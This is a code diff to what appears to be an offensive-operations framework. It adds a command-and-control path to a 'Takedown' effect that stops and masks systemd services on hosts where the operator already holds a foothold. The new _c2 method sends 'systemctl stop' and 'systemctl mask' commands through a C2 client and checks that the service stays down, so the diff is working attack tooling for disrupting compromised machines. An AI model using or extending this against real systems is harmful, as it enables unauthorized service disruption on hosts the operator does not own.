@@ -137,6 +137,8 @@ class Takedown(Effect):
         "allow_ssh": {"type": "str",
                       "desc": "'true' to allow stopping sshd (off by default: "
                               "that is our own access path)"},
+        "access": {"type": "enum", "choices": ["ssh", "c2"],
+                   "desc": "access path chosen by clef after a transport failure"},
     }
     tags = frozenset({"pressure", "impacty"})
     needs = {"foothold": True, "root": False, "c2": False, "os": "any"}
@@ -160,6 +162,9 @@ class Takedown(Effect):
                               "(effects.allow_ssh_takedown or allow_ssh=true)")
 
         mode = params.get("mode") or "stop_mask"
+        access = params.get("access") or "ssh"
+        if access == "c2" and ctx.c2 is None:
+            raise PolicyError("C2 access requested but no C2 client is available")
         if windows:
             return                       # windowless mechanisms are not ladder-ranked
         policy = getattr(ctx, "policy", None)
@@ -189,6 +194,9 @@ class Takedown(Effect):
             return Result(False, f"invalid unit name: {unit!r}")
 
         mode = params.get("mode") or "stop_mask"
+        access = params.get("access") or "ssh"
+        if access == "c2":
+            return self._c2(ctx, ip, fh, unit, mode)
         unit = self._resolve_unit(ctx, ip, fh, unit)
         if mode in HARD_MODES:
             return self._hard_linux(ctx, ip, fh, unit, mode)
@@ -205,6 +213,28 @@ class Takedown(Effect):
         if active:
             return Result(False, f"{unit} still active on {ip} after stop")
         return Result(True, f"{unit} is DOWN on {ip} ({mode})",
+                      data={"access": "ssh"},
+                      impact={"ip": ip, "service": unit, "mode": mode},
+                      restore=restore_recipe(unit, mode))
+
+    def _c2(self, ctx, ip, fh, unit, mode):
+        if mode not in ("stop", "stop_mask"):
+            return Result(False, f"access c2 does not support {mode}")
+        box = ctx.intel.box_by_ip(ip) or {}
+        box_id = f"{box.get('box')}-{box.get('identifier')}"
+        cmd = f"systemctl stop {unit}"
+        if mode == "stop_mask":
+            cmd += f" && systemctl mask {unit}"
+        task = ctx.c2.task(box_id, cmd, timeout=60)
+        if not task.get("ok"):
+            return Result(False, f"C2 {box_id}: {task.get('output') or task.get('detail') or 'task failed'}"[:300],
+                          data={"access": "c2"})
+        check = ctx.c2.task(box_id, f"systemctl is-active {unit}", timeout=30)
+        if (check.get("output") or "").strip().splitlines()[-1:] == ["active"]:
+            return Result(False, f"{unit} still active on {ip} after C2 stop",
+                          data={"access": "c2"})
+        return Result(True, f"{unit} is DOWN on {ip} (C2 {mode})",
+                      data={"access": "c2"},
                       impact={"ip": ip, "service": unit, "mode": mode},
                       restore=restore_recipe(unit, mode))
 
